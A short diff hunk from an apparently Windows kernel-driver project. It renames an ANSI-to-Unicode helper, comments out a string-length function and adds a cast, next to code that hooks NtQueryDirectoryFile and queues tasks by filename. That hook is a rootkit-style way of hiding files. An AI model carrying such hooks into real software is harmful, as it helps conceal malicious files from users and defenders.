@@ -125,20 +125,20 @@ NTSTATUS NTAPI HookNtQueryDirectoryFile(
 	return retStatus;
 }
 
-ULONG StrLenFilename(PCHAR str) {
-	ULONG i = 0;
-	while (str[i++] != '\0');
-	return i;
-}
+//ULONG StrLenFilename(PCHAR str) {
+//	ULONG i = 0;
+//	while (str[i++] != '\0');
+//	return i;
+//}
 
-PWCH AnsiToUnicode(char* str) {
+PWCH AnsiToUnicodeFilename(char* str) {
 
 	ANSI_STRING ansiStr;
 	UNICODE_STRING uniStr;
 	USHORT length;
 
 	RtlInitAnsiString(&ansiStr, str);
-	length = RtlAnsiStringToUnicodeSize(&ansiStr);
+	length = (USHORT)RtlAnsiStringToUnicodeSize(&ansiStr);
 	uniStr.Buffer = (PWCH)ExAllocatePoolWithTag(PagedPool, length, 'oneN');
 	uniStr.MaximumLength = length;
 	RtlAnsiStringToUnicodeString(&uniStr, &ansiStr, FALSE);
@@ -154,7 +154,7 @@ VOID TaskQueueByFilename(PCHAR filename) {
 		//task->filename = ExAllocatePoolWithTag(PagedPool, len * 2, 'oneN');
 		//RtlCopyMemory(task->filename, filename, len);
 		//task->filename[len] = '\0';
-		task->filename = AnsiToUnicode(filename);
+		task->filename = AnsiToUnicodeFilename(filename);
 
 		InsertTailList(&glTaskQueueFile, &task->link);
 	}
